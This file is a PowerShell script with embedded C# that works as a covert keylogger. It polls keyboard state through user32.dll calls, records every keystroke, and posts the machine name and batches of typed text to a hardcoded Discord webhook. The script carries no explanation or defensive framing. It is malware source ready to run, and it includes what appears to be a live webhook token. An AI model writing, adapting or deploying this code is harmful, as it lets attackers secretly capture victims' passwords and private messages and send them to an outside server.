$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger natif propre lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder lpChar, int cchBuff, uint wFlags);
}
'@

$buffer = ''
$shiftPressed = $false
while($true){
    Start-Sleep -m 30
    $shiftPressed = [K]::GetAsyncKeyState(0x10) -band 0x8000

    for($i=8;$i -le 254;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $sb = New-Object Text.StringBuilder
            $keyState = New-Object byte[] 256
            if($shiftPressed){ $keyState[0x10] = 0x80 }

            [K]::ToUnicode($i, [K]::MapVirtualKey($i,0), $keyState, $sb, 2, 0) | Out-Null
            $char = $sb.ToString()
            if($char.Length -eq 0){
                switch($i){
                    8   {$char='[BACKSPACE]'; $buffer=$buffer.Substring(0,[Math]::Max(0,$buffer.Length-1))}
                    13  {$char="[ENTER]`n"}
                    32  {$char=' '}
                    default {$char="[KEY$i]"}
                }
            }
            if($i -ne 8){ $buffer += $char }

            if($buffer.Length -ge 40){
                iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buffer = ''
            }
        }
    }
}
